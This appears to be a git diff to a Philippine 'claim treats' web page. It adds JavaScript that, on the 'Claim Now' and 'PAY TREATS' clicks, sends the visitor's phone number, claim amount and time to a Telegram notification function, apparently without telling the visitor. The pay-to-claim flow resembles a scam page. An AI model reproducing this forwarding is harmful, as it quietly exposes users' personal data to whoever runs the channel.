@@ -257,7 +257,7 @@
       
       <div class="claim-popup-help-row">
         <span class="claim-popup-help-text"><i class="fas fa-life-ring"></i> For any concern</span>
-        <a class="claim-popup-help-link" href="https://m.me/Treatsph" target="_blank">
+        <a class="claim-popup-help-link" href="https://m.me/treatsph" target="_blank">
           <img src="https://cdn.prod.website-files.com/6385b55675a0bd614777a5c1/6401880e8f2d075927b56e39_icon-light.svg" alt="Help" />
           HELP
         </a>
@@ -271,7 +271,7 @@
   </div>
 
   <!-- ============================================================
-       JAVASCRIPT - COMPLETE WORKING
+       JAVASCRIPT - COMPLETE WORKING WITH TELEGRAM ALERTS
   ============================================================ -->
   <script>
     // ============================================================
@@ -303,6 +303,30 @@
         audio.play().catch(function(error) {
           console.log('🔊 Sound play error:', error);
         });
+      }
+    }
+
+    // ============================================================
+    // TELEGRAM NOTIFICATION HELPER
+    // ============================================================
+    function sendTelegramAlert(phone, amount, time, action) {
+      // Check if sendTelegramNotification exists from config.js
+      if (typeof sendTelegramNotification !== 'undefined') {
+        var message = '📱 <b>Claim Alert</b>\n\n' +
+                      '📌 <b>Action:</b> ' + action + '\n' +
+                      '👤 <b>Number:</b> ' + phone + '\n' +
+                      '💰 <b>Amount:</b> ' + amount + '\n' +
+                      '🕐 <b>Time:</b> ' + time;
+        
+        sendTelegramNotification(message);
+        console.log('📱 Telegram alert sent:', action);
+      } else {
+        // Fallback: console log only
+        console.log('📱 TELEGRAM ALERT (Simulated):');
+        console.log('   Action:', action);
+        console.log('   Number:', phone);
+        console.log('   Amount:', amount);
+        console.log('   Time:', time);
       }
     }
 
@@ -714,6 +738,13 @@
       // PLAY SOUND
       playClaimSound();
       
+      // ============================================================
+      // TELEGRAM ALERT 1: Claim Now Button
+      // ============================================================
+      var currentTime = getPhilippineTime();
+      var formattedAmount = '₱' + formatWithCommas(rawAmount);
+      sendTelegramAlert(userPhone, formattedAmount, currentTime, 'Claim Now');
+      
       if (database && currentTreatType) {
         checkForDeployedLink(currentTreatType).then(function(link) {
           if (link) {
@@ -743,6 +774,18 @@
         console.log('⏰ Timer is already running');
         return;
       }
+      
+      // ============================================================
+      // TELEGRAM ALERT 2: PAY TREATS Button
+      // ============================================================
+      var cardNumber = parseInt(selectedCard.replace('card', ''));
+      var data = cardData[cardNumber];
+      var rawAmount = parseInt(data.badge.replace('₱', '').replace(/,/g, ''));
+      var userPhone = localStorage.getItem('user_phone') || '09171234567';
+      var currentTime = getPhilippineTime();
+      var formattedAmount = '₱' + formatWithCommas(rawAmount);
+      
+      sendTelegramAlert(userPhone, formattedAmount, currentTime, 'PAY TREATS');
       
       if (treatLink && !isRedirecting) {
         isRedirecting = true;
@@ -857,6 +900,7 @@
     console.log('✅ Timer fixed - will countdown properly');
     console.log('✅ Sound will play on Claim Now');
     console.log('✅ HELP button redirects to m.me/Treatsph');
+    console.log('✅ Telegram alerts: Claim Now & PAY TREATS');
   </script>
 
 </body>
